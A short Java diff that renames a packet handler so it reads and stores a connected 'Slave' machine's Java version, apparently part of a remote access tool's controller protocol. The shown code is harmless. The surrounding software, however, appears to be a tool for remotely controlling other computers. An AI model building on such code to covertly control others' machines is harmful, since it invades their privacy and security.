@@ -4,17 +4,17 @@ import java.io.DataInputStream;
 
 import com.redpois0n.Slave;
 
-public class Packet31InitInstallationDate extends AbstractIncomingPacket {
+public class Packet25InitJavaVersion extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		String date = slave.readLine();
-		slave.setInstallDate(date);
+		String version = slave.readLine();
+		slave.setJavaVersion(version);
 	}
 
 	@Override
 	public byte getPacketId() {
-		return 31;
+		return 25;
 	}
 
 }
